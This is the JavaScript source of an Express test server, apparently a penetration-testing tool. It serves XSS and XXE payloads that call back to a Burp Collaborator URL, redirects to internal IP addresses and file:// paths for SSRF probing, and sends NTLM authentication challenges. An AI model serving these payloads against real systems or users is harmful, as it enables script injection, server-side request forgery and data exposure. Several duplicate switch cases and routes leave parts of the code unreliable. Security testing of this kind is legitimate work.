const fs = require('fs');
const http = require('http');
const https = require('https');
const express = require('express');
const morgan = require('morgan');
const readline = require('readline-sync');
const yargs = require('yargs');
const bodyParser = require('body-parser');
const spdy = require('spdy');
//const basicAuth = require('express-basic-auth');
//const ntlm = require('express-ntlm');




/* == Handle Command Line Arguments == */

const options = yargs
    .option('httpport', {
        alias: 'p',
        describe: 'Http Port number',
        type: 'number',
        demandOption: true,
        default: 8080
    })
    .option('httpsport', {
        alias: 's',
        describe: 'Https Port number',
        type: 'number',
        demandOption: true,
        default: 8443
    })
    .option('key', {
        alias: 'k',
        describe: 'Key file',
        type: 'string',
        default: 'self_key.key'
    })
    .option('cert', {
        alias: 'c',
        describe: 'Certificate file',
        type: 'string',
        default: 'self_cert.crt'
    })
    .option('burpcollaburl', {
        alias: 'b',
        describe: 'Base URL of the Burp Collaborator Server',
        type: 'string',
        default: 'http://localhost'
    })
    /*.option('hostname', {
        alias: 'h',
        describe: 'Hostname',
        type: 'string',
        default: 'localhost'
    })*/
    .argv;





/* == Process Command Line Arguments for TLS Certificates ==*/

// create TLS Options

const tlsoptions = {
    key: fs.readFileSync(options.key),
    cert: fs.readFileSync(options.cert)
};

// Note collab server hostname
console.log(`Payloads with a callback will send requests to: options.burpcollaburl=${options.burpcollaburl}`);



/* == Initialize Express == */

const app = express();

// This library helps parse the request body so it can be logged
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.text({ type: '*/*' }));

/*
// Middleware for Basic Authentication on specific route
const basicAuthMiddleware = basicAuth({
    //users: { 'username': 'password' },
    challenge: true, // Sends a 401 response that prompts the user for credentials
    unauthorizedResponse: 'Unauthorized'
});

// Middleware for NTLM Authentication on specific route
const ntlmMiddleware = ntlm({
    debug: function() {
      var args = Array.prototype.slice.apply(arguments);
      console.log.apply(null, args);
    },
    domain: 'www.example.com',
    domaincontroller: 'ldap://www.example.com',
  });
*/

//


// This middleware helps parse the request body so it can be logged
app.use((req, res, next) => {
    const originalSend = res.send;

    // Override res.send
    res.send = function (body) {
        // Log the response body
        res.rawBody=body;

        // Call the original send method to send the response
        originalSend.call(this, body);
    };

    next();
});  


app.use((req, res, next) => {
    
    //console.log(moment().format('L')+' '+moment().format('LT'));
    let rawReq = `${req.method} ${req.originalUrl} HTTP/${req.httpVersion}\n`    
    for (const [key, value] of Object.entries(req.headers)) {
        rawReq+=`${key}: ${value}\n`;
    }    
    if(req.body!=null) {        
        if(typeof req.body != 'string' && Object.keys(req.body).length>0) {
            rawReq+="\n";
            for (const [key, value] of Object.entries(req.body)) {
                rawReq+=`${key}=${value}&`;
            }       
        }
        else if (typeof req.body === 'string' && req.body.length>0){
            rawReq+=`\n${req.body}`;
        }
    }
    req.rawReq=rawReq
    //console.log(req.rawReq);

    // Log response details
    res.on('finish', () => {
        let rawRes = `${res._header}`;
        if(res.rawBody!=null) {
            rawRes+=`\n${res.rawBody}`;
        }
        res.rawRes=rawRes;
        //console.log(res.rawRes);
    });

    next();
});




/* == Set up logging == */

// define additional tokens
morgan.token('rawReq', (req) => req.rawReq || '');
morgan.token('rawRes', (req, res) => res.rawRes || '');

// const customLogFormat = '[:date[clf]] :method :url :status :res[content-length] - :response-time ms' + ' - :remote-addr :remote-user :http-version :referrer :user-agent :req[header] :res[header]';
const customLogFormat = '===========================================================================\n[:date[clf]] :remote-addr\n:rawReq\n\n:rawRes';
// Use morgan middleware with the custom log format
console.log("logging to the console.");
app.use(morgan(customLogFormat));

// Set up logging to a file
const logFile = 'http_logs.txt';
const logFileStream = fs.createWriteStream(logFile, { flags: 'a' });
console.log(`logging to the file: ${logFile}`);
app.use(morgan(customLogFormat, { stream: logFileStream }));

// Error-handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    if(res.erroronpurpose!=null)
    {
        next();
    }
    res.status(500).send('Something went wrong!');
});


/* == Set Up Routes == */


// Route: Blank root
app.all('/',(req,res) => {    
    res.send("");
});



// Route: Sends data from a file (xml)
app.all('/bodyfromfile/:code(\\d{3})/xml', (req, res) => {              
    res.setHeader('Content-Type', 'application/xml');
    const code = parseCode(req);
    const fileContent = fs.readFileSync('custom_body.xml', 'utf-8');
    res.send(fileContent);
});

// Route: Sends data from a file (html)
app.all('/bodyfromfile/:code(\\d{3})/html', (req, res) => {              
    res.setHeader('Content-Type', 'text/html');
    const code = parseCode(req);
    const fileContent = fs.readFileSync('custom_body.html', 'utf-8');
    res.send(fileContent);
});

// Route: Sends data from a file (json)
app.all('/bodyfromfile/:code(\\d{3})/html', (req, res) => {              
    res.setHeader('Content-Type', 'application/json');
    const code = parseCode(req);
    const fileContent = fs.readFileSync('custom_body.json', 'utf-8');
    res.send(fileContent);
});

// Route: Sends data from a file (json)
app.all('/bodyfromfile/:code(\\d{3})/txt', (req, res) => {              
    res.setHeader('Content-Type', 'text/plain');
    const code = parseCode(req);
    const fileContent = fs.readFileSync('custom_body.txt', 'utf-8');
    res.send(fileContent);
});


// Create Custom 4XX Responses
app.all('/4XX/:code(4\\d{2})',(req,res) => {
    const code = parseCode(req);
    res.status(code).send()
});

// Create 401 Basic Auth
app.all('/4XX/basic',(req,res) => {
    res.set('WWW-Authenticate', 'Basic realm="MyRealm"');
    res.send();
});      

// Create 401 NTLM Auth
app.all('/4XX/ntlm',(req,res) => {    
    res.set('WWW-Authenticate', 'NTLM');
    res.send();
});

// Create 401 NTLM Negotiate
app.all('/4XX/ntlmnegotiate',(req,res) => {    
    res.set('WWW-Authenticate', 'Negotiate, NTLM');
    res.send();
});


// Create 429 
app.all('/4XX/toomany',(req,res) => {        
    res.sendStatus(429);
});






// Create Custom 5XX Responses
app.all('/5XX/:code(5\\d{2})',(req,res) => {
    const code = parseCode(req);
    res.erroronpurpose=true;
    res.sendStatus(code);
});




// Delay for a specific number of seconds, respond with 200OK
app.all('/delay/200/:seconds(\\d+)',async (req,res) => {
    const seconds = (parseInt(req.params.seconds) || 1)*1000;
    setTimeout(()=> { res.send()},seconds);    
});

// Delay for a specific number of seconds, then redirect
app.all('/delay/302/:seconds(\\d+)',async (req,res) => {
    const seconds = (parseInt(req.params.seconds) || 1)*1000;
    let location = parseLocation(req);
    res.set({'location':location});
    res.status(302);
    setTimeout(()=> { res.send()},seconds);    
});

// Redirect to file - Windows
app.all('/302/file/windows',async (req,res) => {    
    res.set({'location':'file:///C:/Windows/System32/drivers/etc/hosts'});
    res.status(302);
    res.send();
});

// Redirect to file - linux
app.all('/302/file/linux',async (req,res) => {    
    res.set({'location':'file:///etc/hosts'});
    res.status(302);
    res.send();
});


// Redirect with Cookie, See if it comes back
app.all('/302/cookie',async (req,res) => {    
    res.cookie('doiseeitagain','yes');    
    res.status(302).redirect('/302/cookie?itworked=true');    
});

// Create Custom 3XX Responses
app.all('/3XX/:code(3\\d{2})',(req,res) => {
    const code = parseCode(req);    
    let location = parseLocation(req);    
    customRedirect(res, code,location)    
});

// Iterate through some predefined 3XX test cases
app.all('/3XX/testcase/:testcase(\\d+)',(req,res) => {    
    let location = parseLocation(req);
    
    const testcase = Number(req.param.testcase);
    let code = 302;
    switch(testcase){
        case 0:
            code=300;            
            break;
        case 1:
            code=301;
            break;
        case 2:
            code=302;
            break;
        case 3:
            code=303;
            break;
        case 4:
            code=304;
            break;
        case 5:
            code=305;
            break;
        case 6:
            code=307;
            break;
        case 7:
            code=302;
            location="http://localhost/";
            break;
        case 8:
            code=302;
            location="https://localhost/";
            break;
        case 9:
            code=302;
            location="http://127.0.0.1/";
            break;
        case 10:
            code=302;
            location="http://127.2.2.2/";
            break;
        case 11:
            code=302;
            location="http://017700401002/";
            break;
        case 12:
            code=302;
            location="http://10.0.0.1/";
            break;
        case 13:
            code=302;
            location="http://10.2.5.243/";
            break;
        case 11:
            code=302;
            location="http://192.168.0.1/";
            break;
        case 12:
            code=302;
            location="http://192.168.25.231/";
            break;            
        case 13:
            code=302;
            location="";
            break;
    }

    customRedirect(res,code,location);

});



// XSS Payloads
app.all('/xss/testcase/:testcase(\\d+)', (req,res) => {
    let bodyPayload='';
    const testcase = parseInt(req.params.testcase) || 0;

    switch(testcase)
    {
        case 0:
            bodyPayload=getXSSPayload(0,testcase);
            res.set({'Content-Type':'text/html'});
            break;
        case 1:
            res.set({'location':'javascript:'+encodeURIComponent(getXSSPayload(2,testcase))});
            res.set({'Content-Type':'text/html'});
            res.status(302);
            break;
        case 2:
            res.set({'location':'javascript:'+encodeURIComponent(getXSSPayload(3,testcase))});
            res.set({'Content-Type':'text/html'});
            res.status(302);
            break;
        case 3:
            bodyPayload=getXSSPayload(1,testcase);
            res.set({'Content-Type':'text/html'});
            break;
        case 4:
            bodyPayload=getXSSPayload(4,testcase);
            res.set({'Content-Type':'text/html'});
            break;
        case 5:
            bodyPayload=getXSSPayload(4,testcase);
            res.status(500);
            res.erroronpurpose=true;
            res.set({'Content-Type':'text/html'});
            break;
        case 6:
            bodyPayload=getXSSPayload(0,testcase);
            res.set({'Content-Type':'text/html'});
            res.status(500);
            res.erroronpurpose=true;
            break;
        case 6:
            bodyPayload=getXSSPayload(1,testcase);
            res.set({'Content-Type':'text/html'});
            res.status(500);
            res.erroronpurpose=true;
            break;
    }            

    res.send(bodyPayload);
});


app.all('/xml/testcase/:testcase(\\d+)', (req,res) => {
    let bodyPayload='<?xml version="1.0" encoding="UTF-8"?>';
    const testcase = parseInt(req.params.testcase) || 0;
    res.set({'Content-Type':'application/xml'});
    switch(testcase)
    {
        case 0:
            bodyPayload+=`<!DOCTYPE foo [<!ELEMENT foo (#ANY)><!ENTITY xxe SYSTEM "${options.burpcollaburl}/testcase/xxe/${testcase}">]><foo>&xxe;</foo>`;            
            break;
        case 1:
            bodyPayload+=`<!DOCTYPE lolz [<!ENTITY test SYSTEM "${options.burpcollaburl}/testcase/xxe/${testcase}">]><lolz><lol>3..2..1...&test<lol></lolz>`;            
            break;                                    
        case 2:
            bodyPayload+=`<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "${options.burpcollaburl}/testcase/xxe/${testcase}"> %dtd;]><xxx/>]]></foo></soap:Body>`;
            break;
        case 3:
            bodyPayload+=`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "${options.burpcollaburl}/testcase/xxe/${testcase}"> ]><stockCheck><productId>&xxe;</productId></stockCheck>`;            
            break;
        case 4:
            bodyPayload+=`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="${options.burpcollaburl}/testcase/xxe/${testcase}"/></foo>`;            
            break;
    }            
    
    res.send(bodyPayload);
});



/* == Reusable Functions == */

function getXSSPayload(payloadNumber,testcaseNumber)
{
    switch(payloadNumber)
    {
        case 0:
            return `'"><img src="${options.burpcollaburl}/testcase/xss/${testcaseNumber}"/>`;
            break;
        case 1:
            return `'"><script>var img = document.createElement('img');img.src = '${options.burpcollaburl}/testcase/xss/${testcaseNumber}';document.body.appendChild(img);</script>`;
            break;
        case 2:
            return `var img = document.createElement('img');img.src = '${options.burpcollaburl}/testcase/xss/${testcaseNumber}';document.body.appendChild(img);//`;
            break;
        case 3:
            return `document.location.href='${options.burpcollaburl}/testcase/xss/${testcaseNumber}';//`;
            break;
        case 4:
            return `'"><script>document.location.href='${options.burpcollaburl}/testcase/xss/${testcaseNumber}';</script>`;
            break;            
    }
}

function parseCode(req)
{
    const code = parseInt(req.params.code) || 200;
    return code;
}

function parseLocation(req)
{
    let location = req.query.location || req.body.location || '';
    if(location.trim()==='')
    {
        location=req.originalUrl;
    }
    return location;
}

function customRedirect(res, code,location)
{                
    res.set({'location':location});
    res.status(code)
    return res.send();
}

/* == List all routes == */

// Function to extract routes from the Express app
function listRoutes(app, parentPath = '') {
    if (!app) return [];

    const routes = [];

    app._router.stack.forEach((middleware) => {
        if (middleware.route) {
            // Routes registered directly on the app
            routes.push(`${parentPath}${middleware.route.path}`);
        } else if (middleware.name === 'router') {
            // Recurse into nested routers
            const nestedRoutes = listRoutes(middleware.handle, `${parentPath}${middleware.regexp.source}`);
            routes.push(...nestedRoutes);
        }
    });

    return routes;
}

const allRoutes = listRoutes(app);
console.log('All Routes:', allRoutes);

/* == Start Express Server == */

// HTTP2
/*
const server = spdy.createServer(tlsoptions,app);  

server.listen(options.httpsport, () => {
    console.log(`HTTP/2 HTTPS server listening on port ${options.httpsport}`);
});
*/
// HTTP

http.createServer(app).listen(options.httpport, () => {
    console.log(`HTTP server listening on port ${options.httpport}`);
});


// HTTPS
https.createServer(tlsoptions, app).listen(options.httpsport, () => {
    console.log(`HTTPS server listening on port ${options.httpsport}`);
});
